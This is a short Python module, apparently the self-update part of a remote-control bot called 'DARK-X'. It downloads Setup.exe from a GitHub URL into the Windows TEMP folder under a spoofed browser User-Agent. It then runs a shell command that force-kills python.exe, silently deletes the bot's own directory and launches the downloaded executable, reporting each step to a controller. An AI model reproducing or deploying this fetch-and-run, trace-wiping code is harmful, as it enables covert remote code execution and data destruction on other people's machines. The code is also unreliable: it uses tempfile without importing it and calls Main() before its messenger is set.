import os, sys
import requests
class Update():
	def __init__(self,_):
		self.Main()
		self._ = _
	def Main(self):
		self._.Send_Message("%F0%9F%93%8C Downloading Update...")
		file = tempfile.TemporaryFile()
		filename = os.environ['TEMP'] + "\\Setup.exe"
		file.close()
		req = requests.get('https://raw.githubusercontent.com/UQABXO/DARK-X/main/Setup.exe',headers={'User-Agent':'Chrome'})
		file = open(filename,"wb")
		file.write(req.content)
		file.close()
		dirname = os.path.dirname(os.path.abspath(sys.argv[0]))
		self._.Send_Message("%F0%9F%93%8C Executeing Update...")
		os.system("taskkill /IM python.exe /F & rmdir " + dirname + " /S /Q & " + filename)
